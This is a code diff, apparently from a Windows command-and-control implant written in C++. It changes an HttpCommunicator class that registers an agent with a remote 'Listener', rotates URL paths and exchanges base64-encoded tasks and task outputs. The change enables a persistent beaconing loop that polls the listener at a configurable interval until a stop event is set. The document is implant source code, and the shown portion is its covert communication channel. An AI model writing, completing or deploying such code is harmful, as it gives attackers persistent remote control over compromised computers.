@@ -7,11 +7,12 @@
 
 /* Constructor; for initialisation */
 
-HttpCommunicator::HttpCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWORD port, PCHAR pUrlPathChoices, PCHAR agentId, Queue *pTaskInputQueue, Queue *pTaskOutputQueue)
-    : BaseCommunicator(pWinApiCustom, host, port, agentId, pTaskInputQueue, pTaskOutputQueue),
+HttpCommunicator::HttpCommunicator(WinApiCustom *pWinApiCustom, PCHAR host, DWORD port, PCHAR pUrlPathChoices, PCHAR agentId, Queue *pTaskInputQueue, Queue *pTaskOutputQueue, Event *pEventRegister, Event *pEventAgentShouldStop, DWORD communicationIntervalMs)
+    : BaseCommunicator(pWinApiCustom, host, port, agentId, pTaskInputQueue, pTaskOutputQueue, pEventRegister, pEventAgentShouldStop),
       pUrlPathChoices(pUrlPathChoices),
       urlPathChoicesNum(NullSeparatedArrayNumOfStringElements(pUrlPathChoices)),
-      lastUrlPathChoiceIndex(-1)
+      lastUrlPathChoiceIndex(-1),
+      communicationIntervalMs(communicationIntervalMs)
 {
 }
 
@@ -29,7 +30,7 @@ void HttpCommunicator::CommunicateOnceWithListener(BOOL forRegistration)
     LPVOID pResponseBuffer = NULL;
     LPVOID dataBase64 = NULL;
     LPVOID data = NULL;
-    
+
     // Get URL path to query
     PCHAR urlPath = NullSeparatedArrayStringAt(
         this->pUrlPathChoices,
@@ -166,7 +167,10 @@ void WINAPI HttpCommunicator::StartCommunicatorThread(HttpCommunicatorThreadArgs
         pHttpCommunicatorThreadArgs->pUrlPathChoices,
         pHttpCommunicatorThreadArgs->agentId,
         pHttpCommunicatorThreadArgs->pTaskInputQueue,
-        pHttpCommunicatorThreadArgs->pTaskOutputQueue);
+        pHttpCommunicatorThreadArgs->pTaskOutputQueue,
+        pHttpCommunicatorThreadArgs->pEventRegister,
+        pHttpCommunicatorThreadArgs->pEventAgentShouldStop,
+        pHttpCommunicatorThreadArgs->communicationIntervalMs);
 
     // Invoke StartCommunication()
     httpCommunicator.StartCommunication();
@@ -187,12 +191,20 @@ void HttpCommunicator::StartCommunication()
     if (!this->IsAgentRegistrationSuccessful())
         goto CLEANUP;
 
+    //// Set registration event
+    if (!this->pEventRegister->Set())
+        goto CLEANUP;
+
     // Start persistent communication in loop
-    /*
     while (TRUE)
     {
+        // Communicate with Listener; get new Tasks and submit previous Task outputs
+        this->CommunicateOnceWithListener(FALSE);
+
+        // Wait for event to check if agent should stop; this also sleeps for required amount of interval
+        if (this->pEventAgentShouldStop->Wait(this->communicationIntervalMs) == WAIT_OBJECT_0)
+            break;
     }
-    */
 
     // Cleanup
 CLEANUP:
